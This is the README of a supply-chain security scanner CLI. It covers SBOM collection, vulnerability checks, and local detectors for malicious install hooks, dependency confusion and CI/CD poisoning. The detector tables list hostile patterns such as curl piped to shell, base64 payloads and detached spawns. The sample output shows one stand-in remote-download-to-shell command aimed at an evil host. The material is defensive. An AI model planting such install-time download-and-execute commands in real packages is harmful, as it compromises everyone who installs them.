# heretix-cli

[日本語版 README](README.ja.md)

A CLI tool that scans OS packages (RPM, DPKG, APK) and OSS ecosystems (PyPI, npm/yarn/pnpm, Go modules, Composer, Maven, Gradle, JAR/WAR archives) on Linux/Windows servers or Docker container images, then queries a vulnerability API to detect known vulnerabilities. Also performs local supply-chain security checks without any API access: **GlassWorm** (invisible character injection), **Dependency Confusion** (package substitution), **Malicious Install Scripts** (including the Shai-Hulud worm's signature), **CI/CD Pipeline Poisoning**, and **Lock File Integrity** detection.

## Supported Ecosystems

| Ecosystem | Scan Target | Platform |
|---|---|---|
| RHEL / AlmaLinux / Rocky Linux / Oracle Linux / CentOS (RPM) | Parses `var/lib/rpm` / `usr/lib/sysimage/rpm` directly (BDB, NDB, or SQLite) | Linux only |
| Debian / Ubuntu-based (DPKG) | Parses `var/lib/dpkg/status` directly | Linux only |
| Alpine (APK) | Parses `/lib/apk/db/installed` directly | Linux only |
| PyPI | `requirements.txt`, `Pipfile.lock`, `poetry.lock`, `uv.lock` / fallback: `pip list`* | Linux / Windows |
| npm / yarn / pnpm | `package-lock.json`, `yarn.lock`, `pnpm-lock.yaml` / fallback: `npm list -g`, `pnpm list -g`* | Linux / Windows |
| Go (go modules) | `go.mod` / fallback: `go list -m -json all` | Linux / Windows |
| Composer (PHP) | `composer.lock` | Linux / Windows |
| Maven (Java) | `pom.xml` / fallback: `mvn dependency:tree` | Linux / Windows |
| Gradle (Java/Kotlin) | `gradle.lockfile` / `build.gradle` / `build.gradle.kts` | Linux / Windows |
| Java artifacts | `*.jar`, `*.war`, `*.ear` — reads `META-INF/maven/*/pom.properties`, recurses into `WEB-INF/lib` and `BOOT-INF/lib` | Linux / Windows |

\* Only runs for a whole-system scan (`--scan-path` at the filesystem root, the default with no `--image`): skipped for `--image`/`--dockerfile` scans and for any `--scan-path` narrower than the root, since `pip`/`npm`/`pnpm` here always query this process's own host environment regardless of `--scan-path` — never the extracted image or the scanned subdirectory.

## Installation

### Build

```bash
# Static binary for Linux
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o heretix-cli .

# Binary for Windows
GOOS=windows GOARCH=amd64 go build -o heretix-cli.exe .
```

Copy the resulting binary to the target server — no other steps needed.

### Dependencies

```bash
go mod tidy
```

## Usage

### Package Collection (`collect`)

Scans the system and outputs installed packages as a CycloneDX SBOM. Can run offline.

```bash
heretix-cli collect
heretix-cli collect --output packages.json --scan-path /srv
heretix-cli collect --skip npm,pypi --verbose

# Scan a Docker image
heretix-cli collect --image nginx:latest --output nginx-sbom.json
heretix-cli collect --image registry.example.com/myapp:v1.2 --output myapp-sbom.json

# Include the FROM base image from a Dockerfile
heretix-cli collect --image myapp:latest --dockerfile ./Dockerfile --output full-sbom.json
```

> **Deprecated:** `--format json` (the heretix-native inventory format) still works and is read by `check`/`submit`, but it will be removed in a future release. New scripts should not pass `--format json`.

> **CycloneDX SBOM output includes:**
> - **PURL with `?distro=` qualifier** for OS packages (apk/rpm/deb):
>   ```
>   pkg:apk/alpine/curl@7.79.1-r0?distro=alpine-3.18
>   pkg:rpm/almalinux/curl@7.76.1?distro=almalinux-9
>   ```
> - **`bom-ref`** on every component, matching its PURL for correct dependency resolution
> - **`hashes`** per component from lockfile integrity fields (SHA-512 for npm/pnpm, SHA-256 for PyPI)
> - **`licenses`** per component from lockfiles and installed packages (APK, RPM, Composer, npm node_modules, PyPI site-packages)
> - **`properties[cdx:direct]`** marking direct vs. indirect dependencies
> - **`scope: excluded`** marking dev/test-only packages that don't ship in a production build (see the `scope` column below), and OS packages classified as non-runtime (see [Non-runtime packages](#non-runtime-packages))
> - **`properties[heretix:source-package]`** naming the source package an OS binary package was built from, and **`properties[heretix:category]`** (`kernel` / `build`) on non-runtime packages
> - **`bom.dependencies`** section with full dependency graph (npm package-lock.json, pnpm-lock.yaml, uv.lock, poetry.lock, composer.lock)
> - **`metadata.component`** with OCI PURL and image digest for container scans

| Flag | Default | Description |
|---|---|---|
| `--output` | `sbom.json` | Output file path |
| `--format` | `cyclonedx` | Output format: `cyclonedx` (CycloneDX BOM) / `json` (heretix inventory, deprecated) |
| `--scan-path` | `/` (Linux) / `%SystemDrive%\` (Windows) | Root path for filesystem traversal |
| `--skip` | (none) | Sources to skip (e.g. `--skip npm`) |
| `--verbose` | `false` | Enable verbose logging |
| `--image` | (none) | Docker image reference to scan (e.g. `nginx:latest`) |
| `--dockerfile` | (none) | Dockerfile path: also chain-scans the FROM base image |

#### SBOM / Inventory Coverage by Lockfile

The table below shows which metadata fields are populated for each lockfile source.
`✓` = fully supported, `△` = partially supported (see note), `—` = not available in format.

| Lockfile | Packages | `direct` | `deps` | `integrity` | `license` | `scope` |
|---|---|---|---|---|---|---|
| `package-lock.json` v2/v3 | ✓ | ✓ | ✓ | ✓ | △ ⁴ | ✓ ¹⁴ |
| `package-lock.json` v1 | ✓ | — | — | — | △ ⁴ | — |
| `yarn.lock` | ✓ | — | — | — | △ ⁴ | — |
| `pnpm-lock.yaml` v9 | ✓ | ✓ | ✓ | ✓ | △ ⁴ | ✓ ¹⁴ |
| `pnpm-lock.yaml` v5/v6 | ✓ | ✓ | — | ✓ | △ ⁴ | — |
| `requirements.txt` | △ `==` only | ✓ | — | △ with `--hash=` | △ ⁵ | — |
| `Pipfile.lock` | ✓ | ✓ | — | ✓ | △ ⁵ | ✓ ¹⁴ |
| `poetry.lock` | ✓ | — ¹ | ✓ | — | △ ⁵ | — |
| `uv.lock` | ✓ | ✓ | ✓ | ✓ | △ ⁵ | — |
| `go.mod` (parsed) | △ declared only | ✓ | — | — | △ ¹¹ | — |
| `go list` (fallback) | ✓ incl. transitive | — ² | — | — | △ ¹¹ | — |
| `composer.lock` | ✓ | △ ³ | ✓ | — | ✓ | ✓ ¹⁴ |
| `pom.xml` (mvn command) | ✓ incl. transitive | ✓ | ✓ | — | △ ⁶ | ✓ ¹⁵ |
| `pom.xml` (direct parse) | △ declared only | △ | — | — | △ ⁶ | ✓ ¹⁵ |
| `gradle.lockfile` | ✓ incl. transitive | — ⁷ | ✓ | — | △ ¹² | ✓ ¹⁴ |
| `build.gradle(.kts)` (direct parse) | △ declared only | △ | — | — | △ ¹² | ✓ ¹⁵ |
| `*.jar` / `*.war` / `*.ear` | ✓ ⁸ | — ⁹ | — | ✓ SHA-256 | △ ¹⁰ | — |
| RPM | ✓ | — | — | — | ✓ | ✓ ¹⁶ |
| DPKG | ✓ | — | — | — | △ ¹³ | ✓ ¹⁶ |
| APK | ✓ | — | — | — | ✓ | ✓ ¹⁶ |

¹ `direct` for poetry.lock requires reading `pyproject.toml` — not implemented.  
² When the `go` binary is available `go list` is preferred, which provides transitive dependencies but loses `direct` information.  
³ `direct` for composer.lock requires `composer.json` in the same directory.  
⁴ `license` for npm is read from `node_modules/*/package.json` — requires packages to be installed. Covers lockfile parsing, the pnpm virtual store, and the `npm`/`pnpm` global-install fallbacks (`npm root -g`/`pnpm root -g`).  
⁵ `license` for PyPI is read from `site-packages/*.dist-info/METADATA` — requires packages to be installed.  
⁶ `license` for Maven `pom.xml` is extracted from `<licenses>` tag — only root project license, not transitive dependency licenses.  
⁷ `direct` information is not available in gradle.lockfile (all deps appear flattened); use `direct: null` to indicate unknown.  
⁸ Coordinates come from `META-INF/maven/{groupId}/{artifactId}/pom.properties`, falling back to `MANIFEST.MF` when it supplies `Implementation-Vendor-Id`/`-Title`/`-Version`. Archives with neither are skipped rather than guessed at from the filename, since a missing groupId yields a PURL that matches no advisory. Nested archives are reported as `app.war!/WEB-INF/lib/lib.jar`.  
⁹ A compiled artifact carries no record of whether it was a declared or transitive dependency. When the same package is also found in a `pom.xml`, the two entries merge and the build file's `direct` value wins.  
¹⁰ `license` is read from the `pom.xml` embedded alongside `pom.properties` — present only when the JAR was built by Maven.  
¹¹ `license` for Go is read from the module's `LICENSE`/`LICENSE.md`/`LICENSE.txt`/`LICENCE`/`COPYING` file in `GOMODCACHE`, classified by matching its opening lines against known license headers (MIT, Apache-2.0, BSD-2/3-Clause, MPL-2.0, GPL/LGPL-3.0, ISC, Unlicense). Requires a prior local build — the module cache lives outside any container image, so this only helps on a live host scan.  
¹² `license` for Gradle is read from the dependency's POM in the local Gradle module cache (`~/.gradle/caches/modules-2/files-2.1` by default, or `$GRADLE_USER_HOME`) — same live-host-only caveat as Go.  
¹³ `license` for DPKG is read from `/usr/share/doc/{package}/copyright` (the DEP-5 machine-readable format's `License:` field) — present for most packages, but not guaranteed since some upstreams ship free-form copyright text instead.  
¹⁴ `scope: excluded` marks a package resolved only via devDependencies / `packages-dev` / `develop` / test-only Gradle configurations — present in the lockfile's dependency graph but not shipped in a production build (e.g. `pnpm prune --prod`). Where marked `—`, dev/test-only packages are reported the same as production ones with no distinguishing tag.  
¹⁵ Maven and Gradle's build-file parsing paths exclude `scope=test` (Maven) / test-only Gradle configurations outright rather than tagging them, so no dev-only package reaches the output at all — filtering instead of tagging, but the same practical result.  
¹⁶ `scope: excluded` for OS packages marks kernel headers and build toolchain, derived from the source package each binary package was built from — see [Non-runtime packages](#non-runtime-packages).

`deps` PURLs, `integrity` hashes, and `license` information are carried through to the CycloneDX `bom.dependencies`, `components[].hashes`, and `components[].licenses` fields respectively.

### Vulnerability Check (`check`)

Reads the SBOM produced by `collect` (CycloneDX or the deprecated heretix inventory JSON) and queries the vulnerability API.

```bash
heretix-cli check sbom.json
heretix-cli check sbom.json --api-url http://heretix-api:5000 --api-key your-secret-key --severity 7.0
heretix-cli check sbom.json --format json > results.json
```

| Flag | Default | Description |
|---|---|---|
| `--api-url` | `http://localhost:3001` | heretix-api URL |
| `--api-key` | (none) | API authentication key (can also be set via `HERETIX_API_KEY` env var) |
| `--format` | `table` | Output format: `table` / `json` |
| `--severity` | `0.0` | Minimum CVSS score threshold |
| `--concurrency` | `10` | Number of concurrent API requests |
| `--timeout` | `30s` | Per-request timeout |
| `--runtime-only` | `false` | Report only runtime packages (hide kernel header and build toolchain findings) |
| `--verbose` | `false` | Enable verbose logging |

#### Non-runtime packages

A container image usually carries packages that are installed but never run: **kernel headers** (the host kernel is what executes, not `linux-libc-dev`) and **build toolchain** left behind by a build stage (compilers, linkers, `-dev`/`-devel` header packages). On `wordpress:php8.5-fpm` these account for 454 of 719 findings, `linux-libc-dev` alone contributing 388.

`collect` classifies them from the **source package** each binary package was built from — `Source:` in the dpkg status file, `SourceRpm` in the RPM database, `o:` in the APK database. The source package is used rather than the package name because one upstream project is split into many binary packages whose names give nothing away: `libbinutils`, `libctf0`, `libsframe1` and `libgprofng0` are all `Section: libs`, and only their shared `binutils` source identifies them as build tooling.

Two things follow from that same source-package information:

- **Findings are counted per source package, not per binary package.** One `binutils` CVE affects all eight of its binary packages; it is now one row marked `(+7)` rather than eight rows.
- **Non-runtime findings are tagged, not hidden.** They are marked `K` (kernel) or `B` (build) in the report and summarised under `Non-runtime:`, so nothing silently disappears. Pass `--runtime-only` to leave them out.

Measured on `wordpress:php8.5-fpm`: 1485 findings before, **719** after collapsing per source package, **265** with `--runtime-only`.

The SBOM is unaffected by all of this: every package stays a component (CycloneDX `scope: excluded` plus a `heretix:category` property), because dropping components would break the coverage a complete SBOM is supposed to provide.

### One-shot Scan (`scan`)

Runs `collect` and `check` in a single command. No intermediate file needed.

```bash
# Live system scan
heretix-cli scan
heretix-cli scan --scan-path /srv --api-url http://heretix-api:5000 --api-key your-secret-key --severity 7.0

# Docker image scan
heretix-cli scan --image nginx:latest --api-url http://heretix-api:5000 --api-key your-secret-key
heretix-cli scan --image 123456789.dkr.ecr.ap-northeast-1.amazonaws.com/myapp:v1.2 --severity 7.0

# Include the FROM base image from a Dockerfile
heretix-cli scan --image myapp:latest --dockerfile ./Dockerfile --api-url http://heretix-api:5000

# Pass API key via environment variable
HERETIX_API_KEY=your-secret-key heretix-cli scan --api-url http://heretix-api:5000
```

When `--image` is specified, the Docker daemon is checked first; if the image is not found locally it is pulled directly from the registry. Registry authentication is loaded automatically from `~/.docker/config.json` (supports ECR, GCR, and Docker Hub).

When `--image` is specified, the `hostname` field in the generated SBOM is set to the **image reference** (e.g. `nginx:latest`) instead of the machine hostname. This allows each image to be managed as an independent asset when imported into heretix-management.

This command inherits all flags from both `collect` and `check`.

| Flag | Default | Description |
|---|---|---|
| `--image` | (none) | Docker image reference to scan |
| `--dockerfile` | (none) | Dockerfile path: also chain-scans the FROM base image |
| `--skip-local` | `false` | Skip local security checks (GlassWorm, Dependency Confusion, Malicious Install, CI/CD Poisoning, Lock File Integrity) |
| `--check-registry` | `false` | Query npmjs.org to classify unknown npm scopes (requires network) |
| `--runtime-only` | `false` | Report only runtime packages (see [Non-runtime packages](#non-runtime-packages)) |

### GitHub Dependency Submission (`submit`)

Reads an SBOM (CycloneDX or the deprecated heretix inventory JSON) and submits it to the [GitHub Dependency Submission API](https://docs.github.com/en/rest/dependency-graph/dependency-submission) so that Dependabot can generate vulnerability alerts for the detected packages.

```bash
# Typical CI/CD usage — env vars are set automatically by GitHub Actions
heretix-cli collect --output sbom.json
heretix-cli submit sbom.json

# Manual usage
heretix-cli submit sbom.json \
  --token ghp_xxx \
  --repo owner/repo \
  --sha $(git rev-parse HEAD) \
  --ref refs/heads/main
```

| Flag | Default | Description |
|---|---|---|
| `--token` | `$GITHUB_TOKEN` | GitHub token with `contents: write` permission |
| `--repo` | `$GITHUB_REPOSITORY` | Repository in `owner/repo` format |
| `--sha` | `$GITHUB_SHA` | Commit SHA to associate the snapshot with |
| `--ref` | `$GITHUB_REF` | Git ref (e.g. `refs/heads/main`) |
| `--correlator` | `heretix-cli` | Unique string identifying this detector — same value overwrites the previous snapshot |
| `--job-id` | `$GITHUB_RUN_ID` | Unique ID for this run |

Packages detected from lock files are grouped into manifests by source file. Direct dependencies (detected from `// indirect` in `go.mod`, root `dependencies` in `package-lock.json`, or `importers:` in `pnpm-lock.yaml`) are submitted with `relationship: "direct"`; all others use `"indirect"`.

### Local-only Detection (`detect`)

Runs all active local security checks without calling the vulnerability API. Works fully offline.

```bash
heretix-cli detect
heretix-cli detect --scan-path /srv/myapp
heretix-cli detect --format json

# Scan a Docker image
heretix-cli detect --image nginx:latest
heretix-cli detect --image myapp:latest --dockerfile ./Dockerfile
```

| Flag | Default | Description |
|---|---|---|
| `--scan-path` | `/` (Linux) / `%SystemDrive%\` (Windows) | Root path for filesystem traversal |
| `--image` | (none) | Docker image reference to scan |
| `--dockerfile` | (none) | Dockerfile path: also chain-scans the FROM base image |
| `--format` | `table` | Output format: `table` / `json` |
| `--verbose` | `false` | Enable verbose logging |
| `--check-registry` | `false` | Query npmjs.org to classify unknown npm scopes (requires network) |

## Local Security Checks

> **Beta**: Local security checks are currently in beta. Detection rules may produce false positives, and coverage will expand in future releases.

The `scan` and `detect` commands run five local checks that require no network access.

**Automatic skip paths** — irrelevant directories are skipped to avoid false positives and unnecessary I/O:

- **Host scan**: `/proc`, `/sys`, `/dev`, `/boot`, `/run`, `/tmp`, `/var/lib/docker`, `/var/lib/containerd`, `/var/lib/kubelet`, `/usr/src`, `/usr/local/lib/python*`, `/usr/lib/python*`
- **Docker image scan** (`--image`): additionally `/usr/share`, `/usr/lib/locale`, `/usr/lib/node_modules`, `/var/cache`, `/var/lib/apt`, `/var/lib/dpkg`

### GlassWorm Detection

Scans source files for invisible and zero-width Unicode characters that can be used to hide malicious code from human reviewers while still being executed by interpreters.

| Characters | Severity |
|---|---|
| U+202A–U+202E BiDi control (RLO, LRO, etc.) | CRITICAL |
| U+2028, U+2029 Line/Paragraph Separator | HIGH |
| U+FEFF BOM (mid-file) | HIGH |
| U+200B/C/D Zero Width Space/Joiner | MEDIUM |
| U+2060, U+034F Word Joiner, etc. | MEDIUM |

**Context-aware detection for U+200B/200C/200D**: these characters are legitimately required by non-Latin scripts (Devanagari, Arabic, Hebrew, Thai, etc.) for glyph shaping and word-wrapping. They are only flagged when both neighbouring characters are ASCII — the pattern indicative of code-context injection.

Scans `*.py`, `*.js`, `*.ts`, `*.go`, `*.php`, `*.rb`, `*.lock`, `*.toml`, `*.cfg`. JSON files are excluded (data, not executed code).

Reported once per distinct character per file, with the first line and a total count, rather than once per occurrence — an affected file typically contains many repeats of the same character, and the file plus the character is what a reviewer acts on.

Skips `site-packages`, `dist-packages`, `Trash`, `.Trash`, `node_modules`, `vendor`, `.venv`, `venv`, `__pycache__`, `.tox`, `.git`, `testdata`. Also skips minified files (`*.min.js`) and webpack/vite chunk files containing a content hash in the filename.

> `testdata` is skipped by all detectors, following the Go toolchain's treatment of it: the contents are fixtures, never built or executed. Security tooling in particular keeps deliberately malicious samples there.

### Dependency Confusion Detection

Detects configuration patterns that leave projects vulnerable to substitution attacks, where a privately-named package is overridden by a malicious public registry version.

Substitution requires somewhere to substitute *from*, so both npm and PyPI checks are gated on the project actually configuring a second registry. Scope checks run only when `.npmrc` declares a registry other than npmjs.org — merely having an `.npmrc` is not enough, since most contain only behaviour settings like `shamefully-hoist`. Likewise, loose PyPI version specifiers are reported only alongside `--extra-index-url`; with a single index, a version range cannot resolve to a different package.

Well-known public scopes (`@types`, `@prisma`, `@fastify`, `@nestjs`, `@aws-sdk`, etc.) are excluded automatically since they cannot be subject to dependency confusion. Use `--check-registry` to dynamically verify unknown scopes against npmjs.org.

| Check | Ecosystem | Severity |
|---|---|---|
| Scoped package with no registry mapping, where `.npmrc` declares a private registry | npm | HIGH |
| `package-lock.json` / `yarn.lock` / `pnpm-lock.yaml`: private scoped package resolved from public registry | npm | HIGH |
| Completely unpinned version (`*`, `latest`, `next`, or missing) | npm | MEDIUM |
| `--extra-index-url` in `requirements.txt` or `pip.conf` (pip picks highest version across all indexes) | PyPI | HIGH |
| Non-exact version specifiers (`>=`, `~=`) — **only when an extra index is configured** | PyPI | MEDIUM |
| Missing `--hash=sha256:` integrity check — **only when an extra index is configured** | PyPI | LOW |
| Public `GOPROXY` without `GOPRIVATE` covering internal module paths | Go | HIGH |
| Module present in `go.mod` but missing from `go.sum` | Go | MEDIUM |

`--check-registry` queries `https://registry.npmjs.org/-/v1/search?text=scope:<name>&size=1` for each unknown scope. A scope with published packages is treated as public and excluded. Requires network access; scopes are cached within a single run.

### Malicious Install Scripts Detection (Shai-Hulud, RedC2)

Detects dangerous commands in npm lifecycle hooks (`preinstall`, `postinstall`, `prepare`, etc.), a package's entry point, and Python `setup.py` that execute automatically during or after package installation — a common vector for supply chain attacks.

**Hook scripts are followed.** A hook command is often unremarkable on its own — the Shai-Hulud worm's is just `node bundle.js` — while the payload sits in the referenced file. When a hook runs a local script (`node x.js`, `python x.py`, `sh x.sh`), that file's contents are scanned too.

**Obfuscation is the discriminator, for a hook script.** Downloading and executing at install time is how native-binary packages legitimately work: esbuild's `install.js` fetches a platform binary and runs it, performing the same operations an attacker would. What separates them is readability — esbuild's longest line is 125 characters, Shai-Hulud's bundle runs to several thousand on one line. Content matches inside a followed script are therefore capped at MEDIUM, while a minified script executed at install time is HIGH on its own, since obfuscation exists to defeat exactly this kind of inspection.

**Entry points get a narrower check.** The RedC2 campaign used no lifecycle hook at all: the payload was a top-level IIFE in the package's entry point (`main`/`module`/`exports`), which runs on the first `import`/`require` anywhere in the dependency graph — `--ignore-scripts` gives no protection. But an entry point *is* the rest of the package, not a small script apart from it, so the hook-script checks above don't transfer: a minified `dist/index.cjs` is how bundlers ship almost everything, and `child_process`/base64 are ordinary in real functionality. Only a **detached spawn** is checked here — `spawn(...)`/`exec(...)` combined with `detached: true` — since a build-time helper has no legitimate reason to keep a child process running after Node exits, on any build. If the spawned target resolves to a local file, its first bytes are checked against ELF (Linux), PE (Windows, `MZ`), and Mach-O (macOS, including universal binaries) magic numbers regardless of extension, since a bundled binary is often named to look like data (`.bin`, `.dat`). RedC2 itself targeted Linux, but a detached spawn isn't a Linux-specific technique, so all three are checked rather than just ELF.

| Check | Ecosystem | Severity |
|---|---|---|
| `curl`/`wget` output piped to shell (`\| sh`, `\| bash`) | npm / PyPI | CRITICAL |
| Base64-decoded payload piped to shell | npm | CRITICAL |
| `eval()` of network-fetched content | npm | CRITICAL |
| `eval()` in `setup.py` | PyPI | CRITICAL |
| Entry point spawns a child process with `detached: true` | npm | CRITICAL |
| Minified/obfuscated script executed by an install hook | npm | HIGH |
| Executable `.pth` file (runs on every Python start, no import required) | PyPI | HIGH |
| `require('child_process')` / `curl` / `node -e` in the hook command itself | npm | HIGH |
| `exec(compile(...))` obfuscation in `setup.py` | PyPI | HIGH |
| `os.system()` / `subprocess.*()` in `setup.py`, combined with a network fetch | PyPI | HIGH |
| The above hook-command patterns found inside a *followed* hook script | npm | MEDIUM |
| Base64 decoding (`Buffer.from(..., 'base64')`) in hook | npm | MEDIUM |
| Outbound `fetch()` in install hook | npm | MEDIUM |
| Outbound network request in `setup.py` | PyPI | MEDIUM |
| `os.system()` / `subprocess.*()` in `setup.py`, on its own | PyPI | LOW |

Scans `package.json` (including packages under `node_modules/`), each package's resolved entry point, `setup.py`, and `*.pth`.

### CI/CD Pipeline Poisoning Detection

Scans CI/CD configuration files for patterns used to hijack build pipelines or exfiltrate secrets.

**Shell rules apply only inside `run:` blocks.** YAML indentation is tracked so that command patterns are matched where a shell actually receives them. This matters most for secrets: `env: TOKEN: ${{ secrets.X }}` and `with: token: ${{ secrets.X }}` are the documented way to use a secret, and reporting them was the single largest source of noise. Only a secret interpolated straight into a shell command — where it reaches the command line and the logs — is reported.

**Action pinning is judged by owner.** GitHub's own documentation tells you to pin its first-party actions by major tag, so `actions/checkout@v4` is not reported. Third-party tags are reported at LOW: a tag can be force-pushed, which is how the tj-actions/changed-files compromise (CVE-2025-30066) reached its consumers, but the overwhelming majority of such pins are fine.

| Check | System | Severity |
|---|---|---|
| `curl`/`wget` output piped to shell | All | CRITICAL |
| Base64-decoded payload piped to shell | All | CRITICAL |
| User-controlled GitHub event data interpolated into a `run:` step (script injection) | GitHub Actions | CRITICAL |
| `pull_request_target` workflow checking out the PR's own head | GitHub Actions | CRITICAL |
| Outbound `curl`/`wget` download in a `run:` step | All | HIGH |
| GitHub secret interpolated into a shell command inside `run:` | GitHub Actions | HIGH |
| Action pinned to a mutable ref (`@main`, `@master`, `@latest`) | GitHub Actions | HIGH |
| Self-hosted runner reachable from an untrusted trigger | GitHub Actions | HIGH |
| Remote pipeline config loaded via `remote: https://` | GitLab CI | HIGH |
| Inline execution via `node -e` / `python -c` in a `run:` step | All | MEDIUM |
| Third-party action pinned to a tag rather than a commit SHA | GitHub Actions | LOW |

`pull_request_target` runs with the base repository's secrets and a privileged token; checking out the pull request's own code then executes an outsider's changes with them — the entry point for the Nx s1ngularity compromise. Self-hosted runners hold cached credentials and internal network access, so they are reported only when an untrusted trigger (`pull_request_target`, `issue_comment`) can reach them; a self-hosted runner on trusted triggers alone is normal.

Scans `.github/workflows/*.yml`, `Jenkinsfile`, `.gitlab-ci.yml`, `.circleci/config.yml`, `azure-pipelines.yml`, `bitbucket-pipelines.yml`.

### Hardcoded Secrets Detection

> **Note: temporarily disabled.** The detector logic is implemented but not currently active.

Detects credentials and API keys committed directly in source or configuration files using two complementary techniques:

**Known-format patterns** match well-known token structures and are flagged regardless of context:

| Secret Type | Severity |
|---|---|
| AWS Access Key ID (`AKIA...`) | CRITICAL |
| GitHub tokens (`ghp_`, `ghs_`, `gho_`, `github_pat_`) | CRITICAL |
| npm Access Token (`npm_...`) | CRITICAL |
| Slack Token (`xox[baprs]-...`) | CRITICAL |
| Stripe Live Secret Key (`sk_live_...`) | CRITICAL |
| SendGrid API Key (`SG....`) | CRITICAL |
| Google API Key (`AIza...`) | CRITICAL |
| Google OAuth Client Secret (`GOCSPX-...`) | CRITICAL |
| PEM Private Key header | CRITICAL |
| JSON Web Token (JWT) | HIGH |
| Stripe Test Secret Key (`sk_test_...`) | MEDIUM |

**Entropy-based detection** flags high-entropy values (≥ 4.5 bits/char, Shannon entropy) in assignment contexts like `api_key = "..."`, `token: "..."`, `secret_key = "..."`. Pure-hex strings (commit hashes, checksums) are excluded to reduce false positives.

Placeholder values (`changeme`, `YOUR_KEY_HERE`, `<token>`, environment variable references like `$MY_SECRET`) are automatically excluded. Secret values are redacted to `first6***` in finding output to prevent credential leakage in logs.

Scans `.go`, `.py`, `.js`, `.ts`, `.rb`, `.php`, `.java`, `.cs`, `.sh`, `.bash`, `.env`, `.yaml`, `.yml`, `.toml`, `.json`, `.xml`, `.ini`, `.cfg`, `.conf`, `.properties`, `.tf`. Skips `*.example`, `*.template`, `*_test.go`, `*.spec.ts`, etc. Excludes `target/`, `.next/`, `.nuxt/` in addition to standard dependency directories.

### Lock File Integrity Detection

Validates lockfiles for weak or missing integrity hashes, and detects drift between manifest files and their lockfiles — both of which can indicate tampering or a stale dependency snapshot.

| Check | File | Severity |
|---|---|---|
| Direct dependency uses SHA-1 integrity (cryptographically broken — collision attacks possible) | `package-lock.json` | HIGH |
| Dependency declared in `package.json` but absent from `package-lock.json` | `package-lock.json` | MEDIUM |
| Module required in `go.mod` has no entry in `go.sum` (never fetched/verified) | `go.sum` | MEDIUM |
| Package in `Pipfile.lock` has no hash entries (integrity cannot be verified at install) | `Pipfile.lock` | MEDIUM |

## Example Output

### Table Output (default)

```
Vulnerability Check Report
==========================
Source:     inventory.json
Host:       server01
Packages:   1523 checked (rpm: 1200, dpkg: 320, pip: 280, npm: 43)

   ECOSYSTEM   PACKAGE          VERSION    SOURCE                DB    VULN ID               CVSS   EPSS  SUMMARY
   ──────────  ───────────────  ─────────  ────────────────────  ───   ───────────────────   ────   ─────  ──────────────
!  AlmaLinux   curl             7.88.1     rpm                   nvd   CVE-2024-1234          9.8   0.950  Remote code exec
   AlmaLinux   openssl          3.0.11     rpm                   osv   ALSA-2024:5678         7.5   0.123  Buffer overflow
   Debian      libssl3          3.0.11     dpkg                  nvd   CVE-2024-5678          7.5   0.098  Buffer overflow
   PyPI        requests         2.31.0     /srv/myapp/req...     osv   GHSA-xxxx-yyyy         6.1   0.045  SSRF via proxy
 K Debian      linux-libc-dev   6.12.43-1  dpkg                  osv   CVE-2024-4321          7.8   0.010  Kernel use-after-free
 B Debian      binutils(+7)     2.44-3     dpkg                  osv   CVE-2024-9999          5.5   0.002  Heap overflow in BFD
~  PyPI        somepkg          v2024.1    pip                   osv   GHSA-zzzz-zzzz         6.0       -  Some vulnerability
#  npm         malicious-pkg    1.0.0      pnpm-lock.yaml        osv   MAL-2024-1234            -       -  Malicious package

# = malicious package (OSSF Malicious Packages)
! = in CISA Known Exploited Vulnerabilities (KEV) catalog
~ = approximate match (version could not be normalized, showing all vulnerabilities for this package)
K = kernel headers (the host kernel runs, not this package's code)
B = build toolchain (compiler, linker or development headers left from a build stage)
(+N) = the same vulnerability in N more binary packages built from the same source package
DB = data source (osv = Open Source Vulnerabilities, nvd = NIST NVD, advisory = Vendor Advisory)
EPSS = Exploit Prediction Scoring System probability (0.000–1.000)

Summary: 14 packages with 21 findings (1 malware, 1 KEV)
  Malware:          1
  Critical (>=9.0): 1
  High (>=7.0):     4
  Medium (>=4.0):   8
  Low (<4.0):       5
  Non-runtime:      2 (kernel 1, build 1)
  (counted above; re-run with --runtime-only to exclude them)

Local Security Findings
=======================
  TYPE            FILE                                LINE  SEVERITY  DETAIL
  ─────────────── ─────────────────────────────────── ────  ────────  ────────────────────────────────────
G glassworm          /app/utils.py                         42  CRITICAL  invisible char U+202E (RIGHT-TO-LEFT OVERRIDE) detected
D dep-confusion      /app/.npmrc                            -  HIGH      scoped package @myco has no registry mapping in .npmrc
D dep-confusion      /app/requirements.txt                 15  HIGH      --extra-index-url found: pip selects highest version across all indexes
M malicious-install  /app/package.json                      -  CRITICAL  postinstall: remote code download piped to shell — curl https://evil.example/install.sh | sh
C cicd-poisoning     /app/.github/workflows/ci.yml         12  HIGH      [github-actions] action pinned to mutable branch ref — uses: actions/checkout@main
L lockfile-integrity /app/package-lock.json                 -  HIGH      lodash: integrity uses SHA-1 (broken) — regenerate lockfile with npm ≥ 5 to get SHA-512

G = GlassWorm (invisible/zero-width character injection)
D = Dependency Confusion (private package resolvable from public registry)
M = Malicious Install (dangerous command in lifecycle hook)
C = CI/CD Poisoning (pipeline configuration attack pattern)
L = Lock File Integrity (weak hash or manifest/lockfile drift)

Local findings: 6 (1 glassworm, 2 dep-confusion, 1 malicious-install, 1 cicd-poisoning, 1 lockfile-integrity)
```

### JSON Output (`--format json`)

Only JSON is written to stdout (includes both vulnerability results and local findings under `localFindings`). Progress logs go to stderr, so pipe processing works cleanly.

## Exit Codes

| Code | Meaning |
|---|---|
| `0` | No vulnerabilities, malware, or local findings (or successful `collect`) |
| `1` | Vulnerabilities, malware, or local security findings found (for CI/CD integration) |
| `2` | Execution failure |

## CI/CD Examples

### Live System Scan

```bash
export HERETIX_API_KEY=your-secret-key
heretix-cli scan --api-url http://heretix-api:5000 --severity 7.0 --format json > /dev/null
if [ $? -eq 1 ]; then
  echo "High severity vulnerabilities found!"
  exit 1
fi
```

### Docker Image Scan (post-build check)

```bash
docker build -t myapp:latest .
heretix-cli scan --image myapp:latest --api-url http://heretix-api:5000 --api-key your-secret-key --severity 7.0
```

### Full Scan Including Dockerfile Base Image

```bash
heretix-cli scan --image myapp:latest --dockerfile ./Dockerfile \
  --api-url http://heretix-api:5000 --api-key your-secret-key --severity 7.0 --format json > vuln-report.json
```

### Dependabot Integration (GitHub Actions)

```yaml
- name: Collect packages
  run: heretix-cli collect --output sbom.json

- name: Submit to GitHub Dependency Graph
  run: heretix-cli submit sbom.json
  env:
    GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
    # GITHUB_REPOSITORY, GITHUB_SHA, GITHUB_REF, GITHUB_RUN_ID are set automatically
```

Once submitted, Dependabot analyses the snapshot and generates vulnerability alerts for any package with a known CVE.

## Project Structure

```
